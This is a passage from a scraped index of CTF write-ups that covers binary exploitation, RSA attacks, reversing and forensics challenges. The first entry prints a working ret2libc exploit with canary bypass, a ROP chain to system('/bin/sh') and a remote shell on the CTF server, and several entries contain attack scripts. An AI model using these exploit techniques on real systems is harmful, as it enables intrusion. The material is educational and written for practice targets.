and \u0026quot;/bin/sh\u0026quot; inside Glibc, because we can compute the base address of Glibc and thus bypass ASLR. These are the offsets:\n$ ldd notepad linux-vdso.so.1 (0x00007ffe4512a000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff792757000) /lib64/ld-linux-x86-64.so.2 (0x00007ff79295f000) $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts 195: 0000000000084420 476 FUNC GLOBAL DEFAULT 15 _IO_puts@@GLIBC_2.2.5 430: 0000000000084420 476 FUNC WEAK DEFAULT 15 puts@@GLIBC_2.2.5 505: 0000000000124330 1268 FUNC GLOBAL DEFAULT 15 putspent@@GLIBC_2.2.5 692: 0000000000126000 728 FUNC GLOBAL DEFAULT 15 putsgent@@GLIBC_2.10 1160: 0000000000082ce0 384 FUNC WEAK DEFAULT 15 fputs@@GLIBC_2.2.5 1708: 0000000000082ce0 384 FUNC GLOBAL DEFAULT 15 _IO_fputs@@GLIBC_2.2.5 2345: 000000000008e320 159 FUNC WEAK DEFAULT 15 fputs_unlocked@@GLIBC_2.2.5 $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system 237: 0000000000153ae0 103 FUNC GLOBAL DEFAULT 15 svcerr_systemerr@@GLIBC_2.2.5 619: 0000000000052290 45 FUNC GLOBAL DEFAULT 15 __libc_system@@GLIBC_PRIVATE 1430: 0000000000052290 45 FUNC WEAK DEFAULT 15 system@@GLIBC_2.2.5 $ strings -atx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh 1b45bd /bin/sh  Ok, let\u0026rsquo;s exploit the binary locally. First of all, let\u0026rsquo;s compute the base address of Glibc and other addresses:\nputs_offset=0x084420 system_offset=0x052290 bin_sh_offset=0x1b45bd glibc_base_addr=puts_addr-puts_offset log.info(f'Glibc base address: {hex(glibc_base_addr)}') system_addr=glibc_base_addr+system_offset bin_sh_addr=glibc_base_addr+bin_sh_offset p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 156756 [*] Canary: 0xf5acfc6170498100 [*] Leaked puts() address: 0x7fe306356420 [*] Glibc base address: 0x7fe3062d2000 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  As a sanity check, we see that the base address of Glibc ends in 000 in hexadecimal, which is generally correct.\nNow, we will use another ROP chain in order to call system(\u0026quot;/bin/sh\u0026quot;). This time, we must add a ret gadget to prevent stack alignment issues (it is the same pop_rdi_addr plus one):\npayload=b'B'*9 payload+=p64(canary) payload+=p64(0) payload+=p64(pop_rdi_ret_addr) payload+=p64(bin_sh_addr) payload+=p64(pop_rdi_ret_addr+1) payload+=p64(system_addr) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'127') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', payload) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'3') p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 158722 [*] Canary: 0xb7a3e7f603b88800 [*] Leaked puts() address: 0x7fab1d9ab420 [*] Glibc base address: 0x7fab1d927000 [*] Switching to interactive mode $ ls notepad solve.py  We have a shell! Alright, let\u0026rsquo;s run it remotely:\n$ python3 solve.py puzzler7.imaginaryctf.org 3001 [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to puzzler7.imaginaryctf.org on port 3001: Done [*] Canary: 0x86efa0d7c64bd600 [*] Leaked puts() address: 0x7f9b47528ed0 [*] Glibc base address: 0x7f9b474a4ab0 [*] Switching to interactive mode [*] Got EOF while reading in interactive $  Obviously, we don\u0026rsquo;t get a shell because the remote Glibc is different to the local one. Another fact is that the base address does not end in 000. In order to get the correct one, we must take the last three hexadecimal digits of the leaked puts address and search it in libc.rip.\nTo get fewer results, we can leak another function like printf:\n$ python3 solve.py puzzler7.imaginaryctf.org 3001 [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to puzzler7.imaginaryctf.org on port 3001: Done [*] Canary: 0xc92ece03b2b45700 [*] Leaked printf() address: 0x7f867672d770 [*] Glibc base address: 0x7f86766a9350 [*] Switching to interactive mode [*] Got EOF while reading in interactive $  We have three version candidates of Glibc:\nWe update the offsets, and we get a remote shell:\n$ python3 solve.py puzzler7.imaginaryctf.org 3001 [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to puzzler7.imaginaryctf.org on port 3001: Done [*] Canary: 0xaa26c4c98b274200 [*] Leaked puts() address: 0x7f921747ced0 [*] Glibc base address: 0x7f92173fc000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt ictf{gimme_2_months_and_I'll_put_microsoft_out_of_business}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/notepad-as-a-service/","section":"ctf","summary":"ImaginaryCTF 11/07/2022. 75 points. 64-bit binary. Buffer Overflow. Ret2Libc. Bypass ASLR and canary","time":10,"title":"Notepad as a Service"},{"contents":"We are given a file. The flag is contained inside the file:\n$ cat flag picoCTF{s4n1ty_v3r1f13d_28e8376d}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/general-skills/obedient-cat/","section":"ctf","summary":"picoCTF 2021. 5 points. Show the contents of a file","time":1,"title":"Obedient Cat"},{"contents":"We are given a Python code to encrypt the flag, and a Flask application that calls the encryption function:\nfromCrypto.Util.numberimportlong_to_bytes, bytes_to_long, getPrime, inverse importrandom FLAG=b'HTB{--REDACTED--}' p=getPrime(1024) q=getPrime(1024) n=p*q e=257 defencrypt_flag(): a=random.getrandbits(1024) b=random.getrandbits(1024) flag=bytes_to_long(FLAG) msg=a*flag+b ct=pow(msg, e, n) return{'ct': format(ct, 'x'), 'n': format(n, 'x'), 'e': format(e, 'x'), 'a': format(a, 'x'), 'b': format(b, 'x')}  fromflaskimport* fromchallimportencrypt_flag app=Flask(__name__) @app.route('/', methods=['GET']) defindex(): returnrender_template('index.html') @app.route('/api/get_flag', methods=['GET']) defget_flag(): payload=encrypt_flag() returnjsonify(payload) if__name__=='__main__': app.run(host='0.0.0.0', port=1337)  We can express the above RSA computations in mathematical terms (let $F$ be the flag in decimal format):\n$$ m = a \\cdot F + b $$\n$$ c = m ^ e \\pmod{n} = (a \\cdot F + b) ^ e \\pmod{n} $$\nTaking into account that we can call encrypt_flag multiple times, we should say that:\n$$ c_i = (a_i \\cdot F + b_i) ^ e \\pmod{n} $$\nThis is a clear example of Franklin-Reiter related-message attack, because we can define two polynomials $f, g \\in \\mathbb{Z}/n\\mathbb{Z}[x]$ that relate two ciphertexts:\n$$ f(x) = a_1 \\cdot x + b_1 \\qquad g(x) = a_2 \\cdot x + b_2 $$\nSince $f(F)^e - c_1 = 0$ and $g(F)^e - c_2 = 0$, the polynomials $f(x)^e - c_1$ and $g(x)^e - c_2$ share a common factor, which will be a linear polynomial $x - F$, whose root is $F$.\nWe can implement the attack in SageMath as follows:\ndefcomposite_modulus_gcd(f, g): ifg==0: returnf.monic() returncomposite_modulus_gcd(g, f%g) deffranklin_reiter(n, e, ct1, ct2, a1, a2, b1, b2): P.\u0026lt;x\u0026gt;=PolynomialRing(Zmod(n)) f=(a1*x +b1) ^e-ct1 g=(a2*x +b2) ^e-ct2 return -composite_modulus_gcd(f, g).coefficients()[0] % n  Notice the use of composite_modulus_gcd because $\\mathbb{Z}/n\\mathbb{Z}$ is not a finite field, so we cannot define the Greatest Common Divisor (GCD) in this polynomial ring. However, we can apply the Euclidean algorithm (more information in mathematica.stackexchange.com).\nThe only thing we need to do is get the encryption parameters from the Flask applicaton and perform the attack:\n$ sage solve.sage 104.248.162.85:32441 HTB{RSA_f1n1t3_d1ffs_@nd_r31473d_m355493_4774ck5_:eyes:}  The full script can be found in here: solve.sage.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/one-step-closer/","section":"ctf","summary":"Franklin-Reiter related-message attack","time":2,"title":"One Step Closer"},{"contents":"We are given a binary file called ouija:\n$ file ouija ouija: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=53a9e0435f7c7041c557e9d4a8418cb6a916f339, for GNU/Linux 3.2.0, not stripped  Reverse engineering If we open the binary in Ghidra, we will see this decompiled main function in C:\nintmain() { undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined4 local_60; undefined2 local_5c; undefined local_5a; intkey_copy; intr; intm; into; intn; intq; intp; intl; char*enc_flag; intk; intj; inti;  local_78 =0x6877644b7b544c5a; local_70 =0x665f6b615f796661; local_68 =0x6b6d7874675f6c67; local_60 =0x616c7375; local_5c =0x6667; local_5a =0x7d; setvbuf(stdout, NULL, 2, 0); enc_flag =strdup((char*) \u0026amp;local_78); puts(\"Retrieving key.\"); sleep(10); for(i =1; i \u0026lt;0x1e; i =i +1) { if(i %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); key_copy =key; puts(\"Hmm, I don\\'t like that one. Let\\'s pick a new one.\"); sleep(10); for(j =1; j \u0026lt;0x1e; j =j +1) { if(j %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); key_copy =key_copy +5; puts(\"Yes, 18 will do nicely.\"); sleep(10); for(k =1; k \u0026lt;0x14; k =k +1) { if(k %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); puts(\"Let\\'s get ready to start. This might take a while!\"); sleep(10); for(l =1; l \u0026lt;0x32; l =l +1) { if(l %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); for(; *enc_flag !='\\0'; enc_flag =enc_flag +1) { if((*enc_flag \u0026lt;'a') ||('z'\u0026lt;*enc_flag)) { if((*enc_flag \u0026lt;'A') ||('Z'\u0026lt;*enc_flag)) { puts(\"We can leave this one alone.\"); sleep(10); for(m =1; m \u0026lt;10; m =m +1) { if(m %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); } else{ puts(\"This one\\'s an uppercase letter!\"); sleep(10); for(n =1; n \u0026lt;0x14; n =n +1) { if(n %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); if(*enc_flag -key_copy \u0026lt;0x41) { puts(\"Wrapping it round...\"); sleep(10); for(o =1; o \u0026lt;0x32; o =o +1) { if(o %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } } else{ puts(\"This one\\'s a lowercase letter\"); sleep(10); for(p =1; p \u0026lt;0x14; p =p +1) { if(p %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); if(*enc_flag -key_copy \u0026lt;0x61) { puts(\"Wrapping it round...\"); sleep(10); for(q =1; q \u0026lt;0x32; q =q +1) { if(q %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } puts(\"Okay, let\\'s write down this letter! This is a pretty complexoperation, you might want to check back later.\"); sleep(10); for(r =1; r \u0026lt;300; r =r +1) { if(r %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); printf(\"%c\\n\", (ulong) (uint) (int) *enc_flag); } puts(\"You\\'re still here?\"); return0; }  The program will take this string:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import p8, p16, p32, p64 \u0026gt;\u0026gt;\u0026gt; p64(0x6877644b7b544c5a) + p64(0x665f6b615f796661) + p64(0x6b6d7874675f6c67) + p32(0x616c7375) + p16(0x6667) + p8(0x7d) b'ZLT{Kdwhafy_ak_fgl_gtxmkuslagf}'  And will decrypt it. However, it will take a long time (16 minutes and only 2 characters were decrypted):\n$ time ./ouija Retrieving key. ..... done! Hmm, I don't like that one. Let's pick a new one. ..... done! Yes, 18 will do nicely. ..... done! Let's get ready to start. This might take a while! ..... done! This one's an uppercase letter! ..... done! Okay, let's write down this letter! This is a pretty complex operation, you might want to check back later. ..... done! H This one's an uppercase letter! ..... done! Wrapping it round... ..... done! Okay, let's write down this letter! This is a pretty complex operation, you might want to check back later. ..... done! T This one's an uppercase letter! ..... done! Okay, let's write down this letter! This is a pretty complex operation, you might want to check back later. ...^C ./ouija 0,02s user 0,03s system 0% cpu 16:46,49 total  So instead, we must find another approach.\nAnalyzing the cipher These lines of code are the ones that actually decrypt the above string:\nintmain() { // ... key_copy =key; // ... key_copy =key_copy +5; puts(\"Yes, 18 will do nicely.\"); // ... for(; *enc_flag !='\\0'; enc_flag =enc_flag +1) { if((*enc_flag \u0026lt;'a') ||('z'\u0026lt;*enc_flag)) { if((*enc_flag \u0026lt;'A') ||('Z'\u0026lt;*enc_flag)) { puts(\"We can leave this one alone.\"); // ... } else{ puts(\"This one\\'s an uppercase letter!\"); // ... if(*enc_flag -key_copy \u0026lt;0x41) { puts(\"Wrapping it round...\"); // ... *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } } else{ puts(\"This one\\'s a lowercase letter\"); // ... if(*enc_flag -key_copy \u0026lt;0x61) { puts(\"Wrapping it round...\"); // ... *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } // ... } puts(\"You\\'re still here?\"); return0; }  So, we see that they distinguish between uppercase letters, lowercase letters and special characters. For letters, they substract key_copy (which is 18). In some cases, they add 0x1a before to wrap around. Hence, this is a substitution cipher.\nFlag We can do the same operations in the Python REPL and get the flag:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; flag = [] \u0026gt;\u0026gt;\u0026gt; enc_flag = 'ZLT{Kdwhafy_ak_fgl_gtxmkuslagf}' \u0026gt;\u0026gt;\u0026gt; for c in enc_flag: ... if c.isalpha() and c.isupper(): ... flag.append(chr(ord(c) - 18 + 0x1a) if ord(c) - 18 \u0026lt; 0x41 else chr(ord(c) - 18)) ... if c.isalpha() and c.islower(): ... flag.append(chr(ord(c) - 18 + 0x1a) if ord(c) - 18 \u0026lt; 0x61 else chr(ord(c) - 18)) ... if not c.isalpha(): ... flag.append(c) ... \u0026gt;\u0026gt;\u0026gt; ''.join(flag) 'HTB{Sleping_is_not_obfuscation}'  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/ouija/","section":"ctf","summary":"Substitution cipher","time":4,"title":"Ouija"},{"contents":"We are given a binary file called ouija:\n$ file ouija ouija: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2cace162c306a34dcfc4837d648d047e2ea339fe, for GNU/Linux 3.2.0, not stripped  Reverse engineering If we open the binary in Ghidra, we will see this decompiled main function in C:\nintmain() { intkey_copy; intr; intm; into; intn; intq; intp; intl; char*enc_flag; intk; intj; inti;  setvbuf(stdout, NULL, 2, 0); enc_flag =strdup(\"ZLT{Svvafy_kdwwhk_lg_qgmj_ugvw_escwk_al_wskq_lg_ghlaearw_dslwj!}\"); puts(\"Retrieving key.\"); sleep(10); for(i =1; i \u0026lt;0x1e; i =i +1) { if(i %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); key_copy =key; puts(\"Hmm, I don\\'t like that one. Let\\'s pick a new one.\"); sleep(10); for(j =1; j \u0026lt;0x1e; j =j +1) { if(j %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); key_copy =key_copy +5; puts(\"Yes, 18 will do nicely.\"); sleep(10); for(k =1; k \u0026lt;0x14; k =k +1) { if(k %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); puts(\"Let\\'s get ready to start. This might take a while!\"); sleep(10); for(l =1; l \u0026lt;0x32; l =l +1) { if(l %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); for(; *enc_flag !='\\0'; enc_flag =enc_flag +1) { if((*enc_flag \u0026lt;'a') ||('z'\u0026lt;*enc_flag)) { if((*enc_flag \u0026lt;'A') ||('Z'\u0026lt;*enc_flag)) { puts(\"We can leave this one alone.\"); sleep(10); for(m =1; m \u0026lt;10; m =m +1) { if(m %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); } else{ puts(\"This one\\'s an uppercase letter!\"); sleep(10); for(n =1; n \u0026lt;0x14; n =n +1) { if(n %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); if(*enc_flag -key_copy \u0026lt;0x41) { puts(\"Wrapping it round...\"); sleep(10); for(o =1; o \u0026lt;0x32; o =o +1) { if(o %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } } else{ puts(\"This one\\'s a lowercase letter\"); sleep(10); for(p =1; p \u0026lt;0x14; p =p +1) { if(p %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); if(*enc_flag -key_copy \u0026lt;0x61) { puts(\"Wrapping it round...\"); sleep(10); for(q =1; q \u0026lt;0x32; q =q +1) { if(q %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } puts(\"Okay, let\\'s write down this letter! This is a pretty complexoperation, you might want to check back later.\"); sleep(10); for(r =1; r \u0026lt;300; r =r +1) { if(r %5==0) { printf(\"\\r\"); } putchar('.'); sleep(1); } puts(\" done!\"); printf(\"%c\\n\", (ulong) (uint) (int) *enc_flag); } puts(\"You\\'re still here?\"); return0; }  The program will take this string:\nZLT{Svvafy_kdwwhk_lg_qgmj_ugvw_escwk_al_wskq_lg_ghlaearw_dslwj!}  And will decrypt it. However, it will take a long time (16 minutes and only 2 characters were decrypted):\n$ time ./ouija Retrieving key. ..... done! Hmm, I don't like that one. Let's pick a new one. ..... done! Yes, 18 will do nicely. ..... done! Let's get ready to start. This might take a while! ..... done! This one's an uppercase letter! ..... done! Okay, let's write down this letter! This is a pretty complex operation, you might want to check back later. ..... done! H This one's an uppercase letter! ..... done! Wrapping it round... ..... done! Okay, let's write down this letter! This is a pretty complex operation, you might want to check back later. ..... done! T This one's an uppercase letter! ..... done! Okay, let's write down this letter! This is a pretty complex operation, you might want to check back later. ...^C ./ouija 0,02s user 0,03s system 0% cpu 16:46,49 total  So instead, we must find another approach.\nAnalyzing the cipher These lines of code are the ones that actually decrypt the above string:\nintmain() { // ... enc_flag =strdup(\"ZLT{Svvafy_kdwwhk_lg_qgmj_ugvw_escwk_al_wskq_lg_ghlaearw_dslwj!}\"); // ... key_copy =key; // ... key_copy =key_copy +5; puts(\"Yes, 18 will do nicely.\"); // ... for(; *enc_flag !='\\0'; enc_flag =enc_flag +1) { if((*enc_flag \u0026lt;'a') ||('z'\u0026lt;*enc_flag)) { if((*enc_flag \u0026lt;'A') ||('Z'\u0026lt;*enc_flag)) { puts(\"We can leave this one alone.\"); // ... } else{ puts(\"This one\\'s an uppercase letter!\"); // ... if(*enc_flag -key_copy \u0026lt;0x41) { puts(\"Wrapping it round...\"); // ... *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } } else{ puts(\"This one\\'s a lowercase letter\"); // ... if(*enc_flag -key_copy \u0026lt;0x61) { puts(\"Wrapping it round...\"); // ... *enc_flag =*enc_flag +'\\x1a'; } *enc_flag =*enc_flag -(char) key_copy; } // ... } puts(\"You\\'re still here?\"); return0; }  So, we see that they distinguish between uppercase letters, lowercase letters and special characters. For letters, they substract key_copy (which is 18). In some cases, they add 0x1a before to wrap around. Hence, this is a substitution cipher.\nFlag We can do the same operations in the Python REPL and get the flag:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; flag = [] \u0026gt;\u0026gt;\u0026gt; enc_flag = 'ZLT{Svvafy_kdwwhk_lg_qgmj_ugvw_escwk_al_wskq_lg_ghlaearw_dslwj!}' \u0026gt;\u0026gt;\u0026gt; for c in enc_flag: ... if c.isalpha() and c.isupper(): ... flag.append(chr(ord(c) - 18 + 0x1a) if ord(c) - 18 \u0026lt; 0x41 else chr(ord(c) - 18)) ... if c.isalpha() and c.islower(): ... flag.append(chr(ord(c) - 18 + 0x1a) if ord(c) - 18 \u0026lt; 0x61 else chr(ord(c) - 18)) ... if not c.isalpha(): ... flag.append(c) ... \u0026gt;\u0026gt;\u0026gt; ''.join(flag) 'HTB{Adding_sleeps_to_your_code_makes_it_easy_to_optimize_later!}'  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/ouija/","section":"ctf","summary":"Substitution cipher","time":4,"title":"Ouija"},{"contents":"We are given the Python source code used to encrypt the flag:\n#!/usr/bin/env python3 fromCrypto.Util.numberimport* fromrandomimportseed, getrandbits m=bytes_to_long(open('flag.txt', 'rb').read()) print(\"What's your name?\\n\u0026gt;\u0026gt;\u0026gt; \", end='') name=open(0, 'rb').readline().strip() seed(bytes_to_long(name)) e=2*getrandbits(32)+1 p=getPrime(512) q=getPrime(512) n=p*q c=pow(m, e, n) print(f\"Here's your flag, {''.join(chr(i) foriinname)}!\") print(f'{n= }') print(f'{e= }') print(f'{c= }')  It uses a RSA implementation where we can provide a name that will be used as the seed for a Pseudo-Random Number Generator (PRNG). And then the public exponent $e$ is computed as 2 * getrandbits(32) + 1.\nEach time we connect to the server, the public modulus $n$ will be different, but as long as we use the same name, the exponent $e$ will be the same. Hence, we will get this system of congruences:\n$$ \\begin{cases} m^e \\equiv c_1 \\pmod{n_1} \\newline m^e \\equiv c_2 \\pmod{n_2} \\newline m^e \\equiv c_3 \\pmod{n_3} \\newline \u0026hellip; \\newline m^e \\equiv c_k \\pmod{n_k} \\newline \\end{cases} $$\nAccording to the Chinese Remainder Theorem (CRT), this system of congruences will have a unique solution modulo $n_1 \\cdot c_2 \\cdot \\dots \\cdot n_k$ as long as all $n_i$ are coprime with each other (which is satisfied). With enough equations, we will have that $m^e \u0026lt; n_1 \\cdot c_2 \\cdot \\dots \\cdot n_k$, and the solution of the CRT will be precisely $m^e$.\nThen, the next step will be to do the $e$-th root and get $m$.\nTo make this strategy work, we need to find an exponent $e$ that is short enough, so that we don\u0026rsquo;t need to get so many messages.\nOne approach is to use brute force. We will find out that using 8115501 (\u0026quot;{\\xd5-\u0026quot; as bytes) as a seed will result in $e = 73$, which is short enough.\nFor the CRT, I requested 1000 pairs of ciphertext and modulus. Maybe it is a lot, but it will make sure that the CRT works (imported from SageMath into Python).\nThis is the final Python script:\n#!/usr/bin/env python3 fromgmpy2importiroot frompwnimportcontext, log, remote, sys fromrandomimportgetrandbits, seed from sage.all importCRT defmain(): iflen(sys.argv) !=3: log.warning(f'Usage: python3 {sys.argv[0]}\u0026lt;host\u0026gt; \u0026lt;port\u0026gt;') exit(1) host, port=sys.argv[1], sys.argv[2] seeds=log.progress('Seed') foriinrange(10000000): seeds.status(str(i)) seed(i) ifgetrandbits(32) \u0026lt;50: nice_seed=i break ifnice_seedisNone: log.warning('Could not find nice seed') exit(1) seeds.success(str(nice_seed)) name=bytes.fromhex(hex(nice_seed)[2:]) seed(nice_seed) e=2*getrandbits(32) +1 log.info(f'{e= }') ns, cs=[], [] connections=log.progress('Connections') foriinrange(1000): connections.status(str(i +1)) withcontext.local(log_level='CRITICAL'): r=remote(host, int(port)) r.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', name) r.recvuntil(b'n = ') ns.append(int(r.recvline().strip().decode())) r.recvuntil(b'c = ') cs.append(int(r.recvline().strip().decode())) r.close() connections.success(str(i)) m_e= CRT(cs, ns) m=iroot(m_e, e) log.success(f'Flag: {bytes.fromhex(hex(m[0])[2:]).decode()}') if__name__=='__main__': main()  And we obtain the flag:\n$ python3 solve.py puzzler7.imaginaryctf.org 4002 [+] Seed: 8115501 [*] e = 73 [+] Connections: 1000 [+] Flag: ictf{just_f0r_y0uuuuuuuu}  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/personalized/","section":"ctf","summary":"ImaginaryCTF 07/08/2022. 75 points. RSA. PRNG seed. CRT","time":2,"title":"Personalized"},{"contents":"We are given a file called out.pickle. The flag is stored inside, we can visualize its contents in hexadecimal:\n$ xxd out.pickle 00000000: 8004 958c 0000 0000 0000 008c 085f 5f6d .............__m 00000010: 6169 6e5f 5f94 8c0b 466c 6167 5072 696e ain__...FlagPrin 00000020: 7465 7294 9394 2981 947d 9428 8c04 666c ter...)..}.(..fl 00000030: 6167 945d 9428 4b69 4b63 4b74 4b66 4b7b ag.].(KiKcKtKfK{ 00000040: 4b63 4b75 4b63 4b75 4b6d 4b62 4b65 4b72 KcKuKcKuKmKbKeKr 00000050: 4b73 4b5f 4b6f 4b72 4b5f 4b70 4b69 4b63 KsK_KoKrK_KpKiKc 00000060: 4b6b 4b6c 4b65 4b73 4b3f 4b7d 658c 0466 KkKlKeKsK?K}e..f 00000070: 616b 6594 8c1d 6a63 7466 7b63 3075 6c64 ake...jctf{c0uld 00000080: 5f74 6831 735f 6233 5f74 6833 5f66 6c34 _th1s_b3_th3_fl4 00000090: 673f 7d94 7562 2e g?}.ub.  First of all, we see a fake flag: jctf{c0uld_th1s_b3_th3_fl4g?}. But if we take a closer look, we see that the real flag is interleaved with K:\n$ head -c 108 out.pickle | tail -c 54 KiKcKtKfK{KcKuKcKuKmKbKeKrKsK_KoKrK_KpKiKcKkKlKeKsK?K} $ head -c 108 out.pickle | tail -c 54 | tr -d K ictf{cucumbers_or_pickles?}  And the real flag is ictf{cucumbers_or_pickles?}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/pickle/","section":"ctf","summary":"ImaginaryCTF 06/07/2022. 50 points. Python pickle","time":1,"title":"Pickle"},{"contents":"We are given a binary called rev1:\n$ file rev1 rev1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5f9af621b132c2028d8e689cbb5b707f3f3cd28, not stripped  If we run it, the program expects for a PIN:\n$ ./rev1 Masukan PIN = 1234 PIN salah !  Let\u0026rsquo;s debug it with GDB and disassemble main:\n$ gdb -q rev1 Reading symbols from rev1... (No debugging symbols found in rev1) gef➤ disassemble main Dump of assembler code for function main: 0x00000000004005d6 \u0026lt;+0\u0026gt;: push rbp 0x00000000004005d7 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x00000000004005da \u0026lt;+4\u0026gt;: sub rsp,0x10 0x00000000004005de \u0026lt;+8\u0026gt;: lea rdi,[rip+0xdf] # 0x4006c4 0x00000000004005e5 \u0026lt;+15\u0026gt;: mov eax,0x0 0x00000000004005ea \u0026lt;+20\u0026gt;: call 0x4004a0 \u0026lt;printf@plt\u0026gt; 0x00000000004005ef \u0026lt;+25\u0026gt;: lea rax,[rbp-0x4] 0x00000000004005f3 \u0026lt;+29\u0026gt;: mov rsi,rax 0x00000000004005f6 \u0026lt;+32\u0026gt;: lea rdi,[rip+0xd6] # 0x4006d3 0x00000000004005fd \u0026lt;+39\u0026gt;: mov eax,0x0 0x0000000000400602 \u0026lt;+44\u0026gt;: call 0x4004b0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x0000000000400607 \u0026lt;+49\u0026gt;: mov eax,DWORD PTR [rbp-0x4] 0x000000000040060a \u0026lt;+52\u0026gt;: mov edi,eax 0x000000000040060c \u0026lt;+54\u0026gt;: call 0x4005b6 \u0026lt;cek\u0026gt; 0x0000000000400611 \u0026lt;+59\u0026gt;: test eax,eax 0x0000000000400613 \u0026lt;+61\u0026gt;: je 0x400623 \u0026lt;main+77\u0026gt; 0x0000000000400615 \u0026lt;+63\u0026gt;: lea rdi,[rip+0xba] # 0x4006d6 0x000000000040061c \u0026lt;+70\u0026gt;: call 0x400490 \u0026lt;puts@plt\u0026gt; 0x0000000000400621 \u0026lt;+75\u0026gt;: jmp 0x40062f \u0026lt;main+89\u0026gt; 0x0000000000400623 \u0026lt;+77\u0026gt;: lea rdi,[rip+0xba] # 0x4006e4 0x000000000040062a \u0026lt;+84\u0026gt;: call 0x400490 \u0026lt;puts@plt\u0026gt; 0x000000000040062f \u0026lt;+89\u0026gt;: mov eax,0x0 0x0000000000400634 \u0026lt;+94\u0026gt;: leave 0x0000000000400635 \u0026lt;+95\u0026gt;: ret End of assembler dump.  Here we see that our input is passed to cek, so let\u0026rsquo;s disassemble this function:\ngef➤ disassemble cek Dump of assembler code for function cek: 0x00000000004005b6 \u0026lt;+0\u0026gt;: push rbp 0x00000000004005b7 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x00000000004005ba \u0026lt;+4\u0026gt;: mov DWORD PTR [rbp-0x4],edi 0x00000000004005bd \u0026lt;+7\u0026gt;: mov eax,DWORD PTR [rip+0x200a7d] # 0x601040 \u0026lt;valid\u0026gt; 0x00000000004005c3 \u0026lt;+13\u0026gt;: cmp DWORD PTR [rbp-0x4],eax 